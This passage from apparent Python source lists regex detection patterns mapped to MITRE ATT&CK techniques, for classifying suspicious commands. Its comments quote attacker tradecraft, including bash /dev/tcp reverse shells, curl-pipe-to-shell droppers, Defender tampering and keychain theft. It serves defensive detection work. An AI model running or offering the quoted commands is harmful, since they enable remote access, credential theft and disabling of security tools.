    (r"export\s+\w+=[\"']?\w+[\"']?\s*;.*\s+/\$\w+/\$\w+\s+-c\b", ("T1027.010", "Command Obfuscation (bash env-var assembly)", "Defense Evasion")),
    (r"certutil(?:\.exe)?\s+.{0,80}-decode\b", ("T1140", "Deobfuscate/Decode Files", "Defense Evasion")),
    (r"-nop|-noni|-w\s*hidden|-windowstyle\s+hidden", ("T1059.001", "PowerShell (hidden)", "Execution")),
    (r"vssadmin.*delete.*shadows|wbadmin(?:\.exe)?\s+delete\s+(?:systemstatebackup|catalog)", ("T1490", "Inhibit System Recovery", "Impact")),
    (r"cipher\s+/w|sdelete", ("T1070.004", "File Deletion", "Defense Evasion")),
    (r"nslookup|dnsquery", ("T1071.004", "Application Layer Protocol: DNS", "Command and Control")),
    # ── Discovery techniques (T1057, T1082, T1016, T1033) ────────────────
    (r"\bget-process\b|\btasklist\b", ("T1057", "Process Discovery", "Discovery")),
    (r"\bget-service\b|\bnet\s+start\b|\bsc\s+query\b", ("T1007", "System Service Discovery", "Discovery")),
    (r"\bwhoami\b|\bget-wmiobject.*win32_useraccount\b", ("T1033", "System Owner/User Discovery", "Discovery")),
    (r"\bipconfig\b|\bget-netipaddress\b|\bnetsh\s+interface\b", ("T1016", "System Network Configuration Discovery", "Discovery")),
    (r"\bnet\s+user\b|\bnet\s+group\b|\bget-localuser\b", ("T1087", "Account Discovery", "Discovery")),
    (r"\bnet\s+view\b|\bnbtstat\b|\barp\s+-a\b", ("T1018", "Remote System Discovery", "Discovery")),
    (r"\bsysteminfo\b|\bget-computerinfo\b|\bhostname\b|\bver\b(?![a-zA-Z])", ("T1082", "System Information Discovery", "Discovery")),
    # ── Feb-2026 · gaps found by NXGEC evaluator ────────────────────────
    (r"\bnetstat\b|\bget-nettcpconnection\b|\bss\s+-", ("T1049", "System Network Connections Discovery", "Discovery")),
    (r"(?<!\w)del(?:\.exe)?\s+(?:/[a-zA-Z]\s+)*\S+|(?<!\w)rm\s+(?:-[a-zA-Z]+\s+)?\S+\.(?:log|txt|dat|tmp|bak|old)\b|erase\s+\S+", ("T1070.004", "File Deletion", "Defense Evasion")),
    (r"\bnet\s+accounts\b", ("T1201", "Password Policy Discovery", "Discovery")),
    (r"\bquery\s+user\b|\bqwinsta\b", ("T1033", "System Owner/User Discovery", "Discovery")),
    (r"\benv\b(?!\w)|\bset\s*$|printenv|\$env:", ("T1082", "System Information Discovery: env", "Discovery")),
    # ── PowerShell launch (bare invocation) ─────────────────────────────
    (r"\bpowershell(?:\.exe)?\s+(?:-\w+|\$|iex\b)", ("T1059.001", "PowerShell", "Execution")),
    # ── LOLBAS ingress-tool-transfer downloads ──────────────────────────
    (r"certutil(?:\.exe)?\s+(?:-|/)urlcache\b|bitsadmin(?:\.exe)?\s+/transfer\b|"
     r"\biwr\s+http|\bstart-bitstransfer\s+|"
     r"regsvr32(?:\.exe)?\s+.*?/i:https?://|"          # remote scriptlet cradle
     r"rundll32(?:\.exe)?\s+.*?url\.dll,FileProtocolHandler\s+https?://",
     ("T1105", "Ingress Tool Transfer", "Command and Control")),
    # Defender / EDR tampering
    (r"(?:Add|Set|Remove)-MpPreference\b|-DisableRealtimeMonitoring|"
     r"-DisableIOAVProtection|-ExclusionPath|-ExclusionExtension|"
     r"Set-MpPreference\s+-Disable|"
     r"sc\s+(?:stop|config)\s+(?:WinDefend|Sense|MsMpSvc)|"
     r"reg\s+add\s+.*?DisableAntiSpyware",
     ("T1562.001", "Impair Defenses: Disable or Modify Tools", "Defense Evasion")),
    # ── Linux persistence via cron ──────────────────────────────────────
    (r"\bcrontab\s+(?:-l|-e|-r)\b|/etc/cron\.d/|/var/spool/cron/", ("T1053.003", "Scheduled Task/Job: Cron", "Persistence")),
    # ── Container escape via privileged docker ──────────────────────────
    (r"\bdocker\s+run\s+.*--privileged|\bdocker\s+exec\s+.*--user\s+root|\brunc\s+exec\b", ("T1611", "Escape to Host", "Privilege Escalation")),
    # ── Cloud CLI enumeration ───────────────────────────────────────────
    (r"\baws\s+(?:s3|ec2|iam|sts)\b|\baz\s+(?:vm|storage|ad)\b|\bgcloud\s+(?:compute|storage|iam)\b", ("T1526", "Cloud Service Discovery", "Discovery")),
    # ── IEX / in-memory execution ────────────────────────────────────────
    (r"\biex\b|invoke-expression", ("T1059.001", "PowerShell: Invoke-Expression", "Execution")),
    (r"frombase64string", ("T1140", "Deobfuscate/Decode Files or Information", "Defense Evasion")),
    # ── Sandbox / analysis evasion via delay loops ─────────────────────────
    # Attackers stall execution to time out automated sandboxes. Common patterns:
    #   for($i=1;$i-le 13000;$i++){Write-Host n}
    #   while($true){Start-Sleep -s 30; if(...)break}
    #   1..99999 | %{ ... }
    # Match on a loop bound of ≥1000 iterations (below that = benign counter).
    (r"(?:for\s*\(\s*\$\w+\s*=\s*\d+\s*;\s*\$\w+\s*-le\s*(?:[1-9]\d{3,})|start-sleep\s+(?:-s(?:econds)?\s+)?[1-9]\d{2,}|1\s*\.\.\s*[1-9]\d{3,}\s*\|\s*%)",
        ("T1497.003", "Virtualization/Sandbox Evasion: Time Based Evasion", "Defense Evasion")),
    # ── BITS Jobs (explicit long-form) ────────────────────────────────────
    (r"start-bitstransfer|import-module\s+bitstransfer", ("T1197", "BITS Jobs", "Defense Evasion")),
    # ── Linux/Unix shell obfuscation (Feb 2026 training) ──────────────────
    # T1059.004 = Command and Scripting Interpreter: Unix Shell
    # T1027.010 = Command Obfuscation
    # T1140     = Deobfuscate/Decode Files or Information
    # Base64-pipe execution: `echo "..." | base64 -d | sh|bash|zsh|dash|python|perl`
    (r"base64\s+(?:-d|--decode)\s*\|\s*(?:sh|bash|zsh|dash|ksh|python\d?|perl|ruby)\b",
        ("T1059.004", "Unix Shell", "Execution")),
    (r"base64\s+(?:-d|--decode)\s*\|\s*(?:sh|bash|zsh|dash|ksh)\b",
        ("T1027.010", "Command Obfuscation (Base64 pipe-to-shell)", "Defense Evasion")),
    # Hex-pipe execution: `echo <hex> | xxd -r -p | sh|bash` (parallel to base64 pipe)
    (r"xxd\s+-r\s+-p\s*\|\s*(?:sh|bash|zsh|dash|ksh|python\d?|perl|ruby)\b",
        ("T1059.004", "Unix Shell (hex-pipe exec)", "Execution")),
    (r"xxd\s+-r\s+-p\s*\|\s*(?:sh|bash|zsh|dash|ksh)\b",
        ("T1027.010", "Command Obfuscation (Hex pipe-to-shell)", "Defense Evasion")),
    # Reverse-then-execute: `... | rev | (sh|bash|...)` — string-reversal obfuscation
    (r"\|\s*rev\s*\|\s*(?:sh|bash|zsh|dash|ksh)\b",
        ("T1027.010", "Command Obfuscation (rev pipe)", "Defense Evasion")),
    # Env-var slicing: `${VAR:start:len}` used to build commands character-by-character
    (r"\$\{\w+:\d+:\d+\}",
        ("T1027.010", "Command Obfuscation (env-var slicing)", "Defense Evasion")),
    # ── Reverse-shell / non-application-layer C2 (Feb 2026) ──────────────
    # Bash & sh reverse-shell canonical patterns:
    #   exec 3<>/dev/tcp/HOST/PORT
    #   bash -i >& /dev/tcp/HOST/PORT 0>&1
    #   sh -c '0<&196;exec 196<>/dev/tcp/HOST/PORT'
    (r"/dev/(?:tcp|udp)/[a-z0-9.\-\{\}$\{\}%]+/\d{1,5}",
        ("T1095", "Non-Application Layer Protocol (Bash /dev/tcp reverse shell)", "Command and Control")),
    (r"/dev/(?:tcp|udp)/[a-z0-9.\-\{\}$\{\}%]+/(?:4444|1337|8080|9001|31337|443)\b",
        ("T1571", "Non-Standard Port", "Command and Control")),
    (r"bash\s+-[il]?\s*>&\s*/dev/(?:tcp|udp)/|exec\s+\d+\s*<>\s*/dev/(?:tcp|udp)/",
        ("T1059.004", "Unix Shell (reverse shell)", "Execution")),
    # ── CMD reverse-string for-loop (Emotet / QakBot / IcedID) ───────────
    (r"for\s*/L\s+%[a-z]\s+in\s*\(\s*\d+\s*,\s*-1\s*,\s*0\s*\)\s+do\s+.*?!\w+:~%",
        ("T1027.010", "Command Obfuscation (CMD reverse-string for-loop)", "Defense Evasion")),
    # ── Feb-2026 · Case2 + real-world battery gap-fills ──────────────────
    # VBScript Chr(N)&Chr(N)&… character-code assembly (macro dropper)
    (r"(?:chr[wb]?\s*\(\s*(?:&h)?\d+\s*\)\s*[&+]\s*){2,}chr[wb]?\s*\(\s*(?:&h)?\d+\s*\)",
        ("T1059.005", "Visual Basic (VBScript Chr concat)", "Execution")),
    (r"(?:chr[wb]?\s*\(\s*(?:&h)?\d+\s*\)\s*[&+]\s*){3,}",
        ("T1027", "Obfuscated Files or Information (VBS Chr concat)", "Defense Evasion")),
    # Node.js Buffer.from(<b64>,'base64') + zlib.gunzipSync — SocGholish class
    (r"require\s*\(\s*['\"]zlib['\"]\s*\)\.gunzip(?:sync)?\s*\(\s*buffer\.from",
        ("T1059.007", "JavaScript (Node.js zlib.gunzipSync dropper)", "Execution")),
    (r"buffer\.from\s*\([^)]{6,300}?base64[^)]{0,50}?\)[^;]{0,300}?gunzip",
        ("T1027", "Obfuscated Files or Information (Buffer.from base64 + gunzip)", "Defense Evasion")),
    (r"eval\s*\(\s*(?:zlib\.gunzip(?:sync)?\s*\(\s*)?buffer\.from",
        ("T1140", "Deobfuscate/Decode (JS eval Buffer.from)", "Defense Evasion")),
    # HTML-entity encoded command (e.g. &#112;&#111;&#119;&#101;&#114;&#115;…)
    (r"(?:&#\d{2,4};){10,}",
        ("T1027", "Obfuscated Files or Information (HTML entity chain)", "Defense Evasion")),
    (r"(?:&#\d{2,4};){20,}",
        ("T1140", "Deobfuscate/Decode (HTML entity chain)", "Defense Evasion")),
    # Perl inline eval(decode_base64(...)) — cross-platform stager
    (r"perl\s+-M(?:MIME::)?Base64\s+-e\s+.*(?:eval|decode_base64)",
        ("T1059.006", "Perl (base64 eval)", "Execution")),
    (r"perl\s+-e\s+['\"].*?eval\s*\(\s*decode_base64",
        ("T1027.010", "Command Obfuscation (Perl base64 eval)", "Defense Evasion")),
    # BCDEdit recovery / boot-status tamper — ransomware precursor
    (r"bcdedit(?:\.exe)?\s+/set\s+.*?(?:recoveryenabled\s+no|bootstatuspolicy\s+ignoreallfailures)",
        ("T1490", "Inhibit System Recovery (bcdedit)", "Impact")),
    # PowerShell TaskScheduler + encryption key + -Enc (Case2 archetype)
    (r"powershell.*?frombase64string\s*\(.*?\).*?(?:register-scheduledtask|new-scheduledtask|schtasks)",
        ("T1053.005", "Scheduled Task (PowerShell TaskScheduler)", "Persistence")),
    (r"\$encryption[Kk]ey\s*=\s*\[system\.convert\]::frombase64string",
        ("T1027", "Obfuscated Files or Information (PowerShell encryption-key loader)", "Defense Evasion")),
    # ─── Feb 2026 · Case4/5-driven heuristics ────────────────────────
    # Legitimate CDN / object-storage abuse — attackers host payloads on
    # trusted infra to bypass domain-reputation filters. Seen in Case4
    # (jsdelivr.net/gh/...), Case5 (contabostorage.com), and older cases
    # (aliyun OSS, statically.io, raw.githubusercontent.com, cdn.discordapp.com).
    (r"(?:cdn\.jsdelivr\.net/gh/|raw\.githubusercontent\.com/|cdn\.statically\.io/gh/|"
     r"cdn\.discordapp\.com/attachments/|[a-z0-9-]+\.contabostorage\.com/|"
     r"[a-z0-9-]+\.aliyun(?:cs)?\.com/|[a-z0-9-]+\.oss-[a-z0-9-]+\.aliyuncs\.com/|"
     r"[a-z0-9-]+\.b-cdn\.net/|[a-z0-9-]+\.pages\.dev/|[a-z0-9-]+\.workers\.dev/)",
        ("T1105", "Ingress Tool Transfer (Legitimate CDN/Object-Storage Abuse)", "Command and Control")),
    (r"(?:cdn\.jsdelivr\.net/gh/|raw\.githubusercontent\.com/|"
     r"[a-z0-9-]+\.contabostorage\.com/|[a-z0-9-]+\.oss-[a-z0-9-]+\.aliyuncs\.com/)",
        ("T1102", "Web Service (Trusted-Domain C2 Fronting)", "Command and Control")),
    # WinHTTP COM-object stager — different signature from Net.WebClient.
    # Seen in Case4: $w = New-Object -ComObject WinHttp.WinHttpRequest.5.1
    (r"new-object\s+-?comobject\s+winhttp\.winhttprequest",
        ("T1059.001", "PowerShell (WinHTTP COM stager)", "Execution")),
    (r"winhttp\.winhttprequest[^\n]*?\.open\s*\(\s*['\"]GET['\"]",
        ("T1105", "Ingress Tool Transfer (WinHTTP COM stager)", "Command and Control")),
    # `gcm *pattern*` / `gal *pattern*` Bohannon wildcard cmdlet obfuscation
    (r"\((?:gcm|gal|get-command|get-alias)\s+[^)]{0,20}\*[a-z]{1,8}\*[^)]{0,20}\)",
        ("T1027", "Obfuscated Files or Information (PowerShell wildcard cmdlet resolution)", "Defense Evasion")),
    (r"\((?:gcm|gal|get-command|get-alias)\s+[^)]{0,30}\*[a-z]{1,10}\*",
        ("T1059.001", "PowerShell (wildcard cmdlet resolution)", "Execution")),
    # SyncAppvPublishingServer.vbs abuse — signed VBS proxy execution
    (r"syncappvpublishingserver(?:\.vbs)?",
        ("T1216", "System Script Proxy Execution: SyncAppvPublishingServer", "Defense Evasion")),
    # ─── Feb 2026 v1.2.0 · LOLBAS rename tradecraft ─────────────────────
    # Attackers copy signed system LOLBINs (curl, certutil, bitsadmin,
    # powershell, wmic, regsvr32) to arbitrary filenames in Temp / user
    # AppData to bypass name-based EDR detection. Classic sequence:
    #   cmd /c cd /d %TEMP% & copy c:\windows\system32\curl.exe <name>.exe
    (r"copy(?:\.exe)?\s+(?:/[a-z]\s+)*[\"']?(?:c:\\windows\\system(?:32|64)|%windir%\\system(?:32|64)|"
     r"c:\\windows\\syswow64|%windir%\\syswow64)\\"
     r"(curl|certutil|bitsadmin|powershell|pwsh|wmic|regsvr32|rundll32|mshta|msiexec|hh|"
     r"cmstp|installutil|xwizard|sc|wscript|cscript|forfiles|syncappvpublishingserver)\.(?:exe|vbs)[\"']?"
     r"\s+[\"']?[^\\/\s]+\.(?:exe|com|bat|cmd|scr|dll|vbs)[\"']?",
        ("T1036.003", "Masquerading: Rename System Utilities (LOLBAS rename)", "Defense Evasion")),
    (r"copy(?:\.exe)?\s+(?:/[a-z]\s+)*[\"']?c:\\windows\\system(?:32|64)\\curl\.exe",
        ("T1105", "Ingress Tool Transfer (renamed curl.exe)", "Command and Control")),
    # ─── msiexec /i <URL_or_TempPath_or_filename> /qn — silent installer ─
    (r"msiexec(?:\.exe)?\s+(?:/[a-z]\s+)*/i\s+"
     r"(?:https?://\S+|[\"']?[a-z]:\\[^\"'\s]+\.msi[\"']?|[a-zA-Z0-9_\-]+\.msi)"
     r"\s+(?:/[a-z]+\s+)*/q(?:n|b|r|f|uiet)?",
        ("T1218.007", "Msiexec (Silent Remote/Local Installer)", "Defense Evasion")),
    (r"msiexec(?:\.exe)?\s+.*?/i\s+https?://",
        ("T1105", "Ingress Tool Transfer (msiexec remote MSI)", "Command and Control")),
    # ─── cmd /c cd /d %TEMP% — staging-directory pivot ──────────────────
    (r"cmd(?:\.exe)?\s+/[cCkK]\s+cd\s+/[dD]\s+"
     r"(?:%TEMP%|%LOCALAPPDATA%\\Temp|%APPDATA%|%USERPROFILE%\\AppData\\Local\\Temp|"
     r"c:\\users\\[^\\\s]+\\appdata\\local\\temp)",
        ("T1074.001", "Local Data Staging (Temp directory pivot)", "Collection")),
    # ─── OneNote (.one) phishing chain — ONENOTE spawning script hosts ──
    # Signature detects the parent→child chain even from a paste of process
    # command lines (analysts export from Sysmon Event 1 / ProcessTree tools).
    # Parents seen: ONENOTE.EXE from Content.Outlook cache. Children spawned:
    # mshta, wscript, cscript, cmd, hh, curl, rundll32, powershell.
    (r"onenote(?:\.exe)?[^\n]{0,600}?\\(?:mshta|wscript|cscript|cmd|hh|curl|rundll32|powershell|pwsh)\.exe",
        ("T1566.001", "Phishing: Spearphishing Attachment (OneNote embedded)", "Initial Access")),
    (r"appdata\\local\\microsoft\\windows\\inetcache\\content\.outlook\\[a-z0-9]+\\[^\n]{0,200}?\.one\b",
        ("T1204.002", "User Execution: Malicious File (OneNote payload)", "Execution")),
    (r"onenote\\16\.0\\exported\\\{[a-f0-9\-]+\}\\NT\\\d+\\[^\n]{0,60}?\.(?:hta|wsf|vbs|js|bat|cmd|ps1|lnk)",
        ("T1204.002", "User Execution: OneNote extracted embedded file", "Execution")),
    # ─── Suspicious TLD registration / typosquat (Feb-2026 v1.2.0) ──────
    # `.lol`, `.top`, `.click`, `.zip`, `.mov`, `.xyz` are heavily abused
    # by ClickFix / phishing operators for short-lifespan payload domains.
    (r"https?://[a-z0-9\-]+\.(?:lol|top|click|zip|mov|xyz|monster|rest|sbs|cfd|life|quest)/",
        ("T1583.001", "Acquire Infrastructure: Domains (suspicious TLD)", "Resource Development")),
    # ─── Free-hosting / transfer service abuse (staging + delivery) ─────
    (r"(?:transfer\.sh|anonfiles\.com|filebin\.net|gofile\.io|catbox\.moe|litter\.catbox\.moe|"
     r"file\.io|tempfiles\.ninja|sendgb\.com|dropmefiles\.com)/",
        ("T1567.002", "Exfiltration to Cloud Storage / Free-Hosting Delivery", "Exfiltration")),
    (r"https?://(?:transfer\.sh|anonfiles\.com|filebin\.net|gofile\.io|catbox\.moe|file\.io)/",
        ("T1105", "Ingress Tool Transfer (Free-hosting staging)", "Command and Control")),
    # ─── PowerShell wildcard file resolution (c*d.e?e → cmd.exe) ────────
    (r"[a-z]\*[a-z]?\.[a-z]\?[a-z]\b|[a-z]{1,3}\*\.[a-z]{2,4}\b",
        ("T1027", "Obfuscated Files or Information (wildcard path resolution)", "Defense Evasion")),
    # ─── Blind XOR / repeating-key XOR present (analyst-facing hint) ────
    (r"-b?xor\s+0x[0-9a-f]{2,4}|-b?xor\s+[\"']?[a-z0-9!@#\$%\^&\*]{2,16}[\"']?",
        ("T1027.013", "Encrypted/Encoded File (XOR cipher)", "Defense Evasion")),
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.2.0 · macOS Archetype Family
    # ═══════════════════════════════════════════════════════════════════
    # Amos Stealer / MacStealer / RustDoor / KandyKorn / Pupy — common
    # macOS tradecraft: osascript AppleScript dialogs, LaunchAgent/Daemon
    # persistence, curl-piped installers, keychain dumping, mdworker
    # process abuse. Detects flat-file paste of process command lines.
    #
    # ─── AppleScript / osascript execution ──────────────────────────────
    (r"osascript\s+(?:-e\s+|-l\s+JavaScript\s+-e\s+|-l\s+AppleScript\s+-e\s+)",
        ("T1059.002", "Command and Scripting Interpreter: AppleScript", "Execution")),
    (r"osascript\s+.{0,200}?(?:display\s+dialog|activate|do\s+shell\s+script)",
        ("T1059.002", "AppleScript with dialog/shell — likely credential prompt", "Execution")),
    # Fake credential prompt — Amos Stealer signature
    (r"display\s+dialog\s+[\"'](?:System\s+Preferences|MacOS|Please\s+enter|password|verification)",
        ("T1056.002", "Input Capture: GUI Input Capture (fake password prompt)", "Credential Access")),
    # ─── LaunchAgent / LaunchDaemon persistence ─────────────────────────
    (r"(?:~/Library|/Library|/System/Library)/LaunchAgents/[^\s]+\.plist|"
     r"(?:~/Library|/Library|/System/Library)/LaunchDaemons/[^\s]+\.plist",
        ("T1543.001", "Create or Modify System Process: Launch Agent/Daemon", "Persistence")),
    (r"launchctl\s+(?:load|bootstrap|enable|kickstart)\s+.*?(?:LaunchAgents|LaunchDaemons)",
        ("T1543.001", "launchctl load (LaunchAgent/Daemon persistence)", "Persistence")),
    # ─── macOS credential theft ─────────────────────────────────────────
    (r"security\s+(?:find-generic-password|find-internet-password|dump-keychain|unlock-keychain)",
        ("T1555.001", "Credentials from Password Stores: Keychain", "Credential Access")),
    (r"~/Library/Keychains/login\.keychain|/Library/Keychains/System\.keychain",
        ("T1555.001", "macOS Keychain file access", "Credential Access")),
    # Safari / Chrome / Firefox / Brave / Edge macOS profile paths
    (r"~/Library/Application\s+Support/(?:Google/Chrome|BraveSoftware/Brave-Browser|"
     r"Microsoft\s+Edge|com\.apple\.Safari|Firefox)/",
        ("T1555.003", "Credentials from Web Browsers (macOS profile)", "Credential Access")),
    # ─── curl | sh / bash — canonical macOS/Linux dropper ───────────────
    (r"(?:curl|wget)\s+(?:-\w+\s+)*[\"']?https?://[^\s'\"]+[\"']?\s*\|\s*(?:sh|bash|zsh|osascript|python\d?)\b",
        ("T1105", "Ingress Tool Transfer (curl-pipe-to-shell macOS/Linux dropper)", "Command and Control")),
    # ─── xattr strip — remove Gatekeeper quarantine (macOS bypass) ──────
    (r"xattr\s+(?:-d\s+|-c\s+|-r\s+-d\s+)?com\.apple\.quarantine|"
     r"xattr\s+-cr\s+\S+",
        ("T1553.001", "Subvert Trust Controls: Gatekeeper Bypass (xattr strip)", "Defense Evasion")),
    (r"spctl\s+(?:--master-disable|--global-disable|-a\s+-t\s+open)",
        ("T1553", "Subvert Trust Controls: Disable Gatekeeper (spctl)", "Defense Evasion")),
    # ─── sudo -S piped password / TCC bypass ────────────────────────────
    (r"echo\s+[\"'][^\"']{4,}[\"']\s*\|\s*sudo\s+-S\b",
        ("T1548.003", "Abuse Elevation Control Mechanism: Sudo (piped password)", "Privilege Escalation")),
    (r"tccutil\s+(?:reset|delete)\s+(?:All|SystemPolicyAllFiles|Accessibility|ScreenCapture)",
        ("T1562", "Impair Defenses: Reset TCC permissions", "Defense Evasion")),
    # ─── Amos Stealer file exfil paths ──────────────────────────────────
    (r"/private/tmp/[a-z0-9]{4,}/(?:passwords|Keychain|wallets|browsers)|"
     r"~/(?:Documents|Desktop|Downloads)/.*?\.(?:zip|tar\.gz)\s+.*?curl.*?--data-binary",
        ("T1560", "Archive Collected Data (Amos/MacStealer exfil archive)", "Collection")),
    # ─── mdworker / dscl / defaults abuse ───────────────────────────────
    (r"\bdscl\s+\.\s+-(?:read|list|change)\s+/Users/",
        ("T1087.001", "Local Account Discovery (dscl macOS)", "Discovery")),
    (r"defaults\s+write\s+.*?LSUIElement|defaults\s+write\s+.*?ApplePersistenceIgnoreState",
        ("T1547.015", "Boot or Logon Autostart: LSUIElement/PersistenceIgnoreState", "Persistence")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.2.0 · Cloud & Identity Abuse (Entra / Teams / OAuth)
    # ═══════════════════════════════════════════════════════════════════
    # ─── OAuth device-code phishing (Entra ID / M365) ───────────────────
    # Attackers send victim a device_code + user_code and phish them into
    # completing the OAuth flow, granting attacker a token bound to their
    # session. Canonical URLs: /oauth2/v2.0/devicecode, /devicelogin.
    (r"https?://(?:login\.microsoftonline\.com|login\.microsoft\.com|login\.live\.com)/"
     r"(?:[a-f0-9\-]{8,}|common|organizations|consumers)/oauth2/(?:v2\.0/)?"
     r"(?:devicecode|token|authorize)",
        ("T1566.002", "Phishing: Spearphishing Link (OAuth Device-Code flow)", "Initial Access")),
    (r"microsoft\.com/devicelogin\?otc=[A-Z0-9]{6,}|"
     r"microsoft\.com/devicelogin\s+.*?user_code",
        ("T1621", "Multi-Factor Authentication Request Generation (device-code MFA push)", "Credential Access")),
    # ─── Illicit consent / OAuth token abuse ────────────────────────────
    (r"scope=(?:Mail\.Read|Mail\.ReadWrite|Files\.ReadWrite\.All|offline_access|"
     r"Directory\.Read\.All|User\.Read\.All|Sites\.ReadWrite\.All|Chat\.ReadWrite)",
        ("T1550.001", "Use Alternate Authentication Material: OAuth Token (over-scoped consent)", "Defense Evasion")),
    (r"client_id=[a-f0-9\-]{20,}.*?scope=.*?(?:Mail\.|Files\.|Directory\.|Chat\.)",
        ("T1528", "Steal Application Access Token (illicit-consent grant)", "Credential Access")),
    # ─── Microsoft Teams external-tenant / webhook / GIFshell abuse ─────
    (r"https?://[a-z0-9\-]+\.webhook\.office\.com/webhookb2/",
        ("T1102", "Web Service: Trusted Domain (Teams Incoming Webhook C2)", "Command and Control")),
    (r"https?://teams\.microsoft\.com/l/(?:chat|meetup-join|message)/",
        ("T1204.002", "User Execution: Teams deep-link click", "Execution")),
    (r"graph\.microsoft\.com/(?:v1\.0|beta)/(?:me|users/[^/]+)/(?:messages|drive|chats)",
        ("T1567", "Exfiltration Over Web Service (Microsoft Graph API)", "Exfiltration")),
    # ─── AzureAD / Entra ID · Primary Refresh Token abuse ───────────────
    (r"PRT\s*(?:cookie|token)|x-ms-refreshtokencredential|"
     r"aadinternals|adfsdump|aadconnect|azurehound",
        ("T1550.001", "Primary Refresh Token / Entra ID abuse", "Defense Evasion")),
    # ─── AWS keys pattern (canonical + Session Token) ───────────────────
    (r"AKIA[0-9A-Z]{16}",
        ("T1552.001", "Unsecured Credentials: AWS Access Key ID", "Credential Access")),
    (r"aws_secret_access_key\s*=\s*[A-Za-z0-9/+]{40}",
        ("T1552.001", "Unsecured Credentials: AWS Secret Access Key", "Credential Access")),
    # ─── GCP / Azure service-account key exfil paths ────────────────────
    (r"gcloud\s+iam\s+service-accounts\s+keys\s+create|"
     r"az\s+ad\s+sp\s+credential\s+reset|"
     r"kubectl\s+create\s+token\s+.*--duration",
        ("T1098.001", "Account Manipulation: Additional Cloud Credentials", "Persistence")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · VHDX/VHD virtual-disk delivery tradecraft
    # (Ref: Gurucul 2026-07 Overlord RAT via Tax_Assessment.vhdx)
    # ═══════════════════════════════════════════════════════════════════
    (r"(?:mount-diskimage|mount-vhd|get-diskimage)\s+.*?\.(?:vhdx?|iso|img)\b|"
     r"powershell.*?mount-diskimage",
        ("T1204.002", "User Execution: Malicious File (VHDX/VHD/ISO container)", "Execution")),
    (r"powershell(?:\.exe)?\s+-w(?:indowstyle)?\s+hidden\s+-nop\s+-c\s+[\"']?sleep\s+\d+\s*;"
     r"[^\n]{0,400}?(?:Get-DiskImage|Get-Partition|Get-Volume)[^\n]{0,300}?"
     r"(?:InvokeVerb\([\"']?Eject|Dismount-DiskImage)",
        ("T1070.004", "Indicator Removal: File Deletion (VHDX auto-eject + delete)", "Defense Evasion")),
    (r"\(New-Object\s+-ComObject\s+Shell\.Application\)\.Namespace\(17\)\.ParseName\([^)]+\)\.InvokeVerb\([\"']?Eject",
        ("T1070.004", "Shell.Application Namespace(17) Eject — VHDX auto-unmount", "Defense Evasion")),
    (r"\b\w{3,20}\.exe\b[^\n]{0,200}\b(?:event|version|dbghelp|winhttp|dbgcore|iertutil|"
     r"loghelp|profapi|sqlite3|winmm|ffmpeg)\.dll\b",
        ("T1574.001", "Hijack Execution Flow: DLL Side-Loading", "Defense Evasion")),
    (r"(?:username|computername|hostname|user[\s_-]?name)[^\n]{0,80}?"
     r"(?:\bsandbox\b|\bhoney(?:pot)?\b|\bvmware\b|\bVBox\b|\bVirtualBox\b|\bQEMU\b|\bCuckoo\b|"
     r"\banalyst\b|\bmalware\b|\bany\.?run\b|\btriage\b|\bjoesandbox\b|\bhybrid-analysis\b)",
        ("T1497.001", "Virtualization/Sandbox Evasion: System Checks (username/host match)", "Defense Evasion")),
    (r"\bIsRunningInVirtualMachine\s*\(\s*\)",
        ("T1497", "Explicit VM-detection function (SheetAgent/anti-analysis)", "Defense Evasion")),
    (r"\b(?:x64dbg|x32dbg|ida64|windbg|ollydbg|binaryninja|cutter|frida|"
     r"wireshark|fiddler|tcpdump|dumpcap|mitmdump|httpdebugger|fakenet|inetsim|"
     r"processhacker|procexp|ksdumper|apimonitor|dynamorio)\.exe\b",
        ("T1057", "Process Discovery (analysis-tool enumeration)", "Discovery")),
    (r"\b(?:vmhgfs|vmci|vmmouse|vm3dmp|vboxguest|vboxsf|vboxvideo|vboxmouse|"
     r"prleth|prlfs|prlmouse|prlvideo|prlvnic)\.sys\b",
        ("T1497.001", "Virtualization driver .sys enumeration (Overlord tradecraft)", "Defense Evasion")),
    (r"\b(?:VMware\s+SVGA|Xen\s+VGA|QXL|VirtualBox\s+Graphics\s+Adapter)\b",
        ("T1497.001", "Graphics-adapter-based VM detection", "Defense Evasion")),
    (r"Overlord-[A-Za-z0-9]{18,24}_[CS]",
        ("T1027", "Overlord RAT mutex marker (family classifier)", "Defense Evasion")),
    (r"\b(?:donut|shellcode[-_]?runner|Amsi(?:ScanBuffer|BypassPatch))\b[^\n]{0,200}?"
     r"(?:VirtualAlloc(?:Ex)?|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx)",
        ("T1055.002", "Portable Executable Injection / Donut-loader in-memory execution", "Defense Evasion")),
    (r"(?:\bRC4(?:Decrypt|Init|Crypt)\b|InitRC4Ctx)",
        ("T1027.013", "RC4 shellcode decryption routine", "Defense Evasion")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · ControlR RMM abuse + Google Sheets C2
    # (Ref: Seqrite 2026-07 Operation ShadowRecruit / APT36)
    # ═══════════════════════════════════════════════════════════════════
    (r"\bdemo\.controlr\.app\b|controlr\.app/(?:download|install|api)|"
     r"ControlR\.Agent\.Installer(?:\.exe)?|-TenantId\s+[a-f0-9\-]{20,}",
        ("T1219", "Remote Access Software: ControlR RMM abuse (APT36 tradecraft)", "Command and Control")),
    (r"https?://sheets\.googleapis\.com/v4/spreadsheets/[A-Za-z0-9_\-]{20,}|"
     r"https?://www\.googleapis\.com/(?:auth/spreadsheets|drive/v3/files)",
        ("T1102", "Web Service: Google Sheets / Drive (C2 channel)", "Command and Control")),
    (r"[\"']?service_account[\"']?\s*[:=]\s*[\"'][a-z0-9\-]+@[a-z0-9\-]+\.iam\.gserviceaccount\.com[\"']|"
     r"[\"']?private_key_id[\"']\s*:\s*[\"'][a-f0-9]{20,}[\"']",
        ("T1552.001", "Unsecured Credentials: Google service-account credentials (embedded)", "Credential Access")),
    (r"schtasks(?:\.exe)?\s+/create\s+.*?/tn\s+[\"']?(?:WindowsDefenderSync|WinSyncDefender|"
     r"DefenderSyncService|MicrosoftUpdateSync|WindowsNetlogonSync)[^\"'\s]{0,40}[\"']?",
        ("T1053.005", "Scheduled Task masquerading as Windows Defender/Update service", "Persistence")),
